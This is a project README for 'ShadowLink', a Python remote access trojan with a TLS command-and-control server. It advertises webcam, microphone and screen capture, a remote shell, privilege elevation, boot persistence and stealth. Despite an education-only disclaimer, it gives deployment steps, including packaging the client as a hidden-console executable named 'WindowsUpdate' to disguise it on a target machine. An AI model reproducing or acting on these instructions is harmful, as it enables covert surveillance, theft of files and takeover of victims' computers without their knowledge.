# Remote-Access-Trojan  (ShadowLink)
Remote Access Trojan- Remote Access Tool : A tool that allows you to control a remote and discreet device.
# 🌑 ShadowLink

> **Silent. Continuous. Never Stops.**

A Remote Access Tool- Remote Access Trojan for cybersecurity research and authorized penetration testing.

---

## ⚠️ Disclaimer

**For educational and authorized testing purposes only.**

This tool was created strictly for:
- Cybersecurity research and education
- Authorized penetration testing

**Unauthorized access to computer systems is illegal.** I accept no responsibility for misuse.


---

## 🎯 Features

- 🔐 **TLS/SSL Encryption** - Secure connection with built-in certificates
- 🔄 **Automatic Reconnection** - Maintains a constant connection
- 📁 **File Transfer** - Upload and download in both directions
- 📸 **Screenshot & Camera** - Visual monitoring
- 🎤 **Audio Recording** - Microphone capture
- 💻 **Remote Shell** - Execute PowerShell commands
- 🔑 **Elevate Privileges** - Request administrator privileges
- 🔁 **Persistence** - Automatic startup on boot
- 🌑 **Stealth and Silent Operation**

---

## 📦 Installation

### Requirements
```bash
pip install opencv-python pillow sounddevice lameenc pyopenssl cryptography
```

### Setup

1. **Create Certificates** SSL**
```bash
python generate_cert.py
```

2. **Configure Connection**

Edit both `server.py` and `client.py`:
```python
SERVER_IP = "Server Address"
PORT = Port assigned to you
```

3. **Include Certificate**

Copy the content of `server.crt` and paste it into `client.py`:
```python
self.SERVER_CERT = """-----BEGIN CERTIFICATE-----
(Paste the certificate here)
-----END CERTIFICATE-----"""
```

---

## 🚀 Usage
### Start Server
```bash
python ShadowLink_Server.py
```

### Deploy Client

**For testing:**
```bash
python rat.py

```

**For production (converting to .exe):**
```bash
# Install PyInstaller
pip install pyinstaller
# Convert without CMD window
pyinstaller --onefile --noconsole --name "WindowsUpdate" rat.py

# Output: dist/WindowsUpdate.exe

```

**Options:**
- `--onefile` - Create a single executable file
- `--noconsole` - Hide the CMD window
- `--name "Name"` - Custom name for the file
- `--icon=icon.ico` - Add a custom icon (optional)

**Important:** Always use `--noconsole` to hide the CMD window when running on the target machine.

---

## 💻 Available Commands
```
download <file>
upload <file>
screenshot
image <camera>
audio <seconds>
cd <path>
/admin
/help
/exit
/quit
<any shell command>
```

---

## 🏗️ Architecture
```
Server (C2) ◄──TLS/SSL──► Client (RAT)
```

- **Connection:** TLS/SSL encrypted
- **Port:** (Modifyable)
- **Protocol:** JSON + Binary

---

## 🔧 Troubleshooting

**Connection Issues:**
- Check your firewall (allow the selected port)
- Verify that `SERVER_IP` and `PORT` match in both files
- Ensure that certificates are created correctly

**Continuity: No Operation:**
- Check: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

**Certificate Errors:**
- Recreate certificates with the correct IP address
- Ensure the certificate is included in `rat.py`

---

##⚠️ Warning

**Project:** ShadowLink

**Purpose:** Cybersecurity Education

**Caution:** Use responsibly and legally

---

<div align="center">

**🌑 Made for Cybersecurity Research 💀**

⭐ Star the project if you found it useful!

</div>
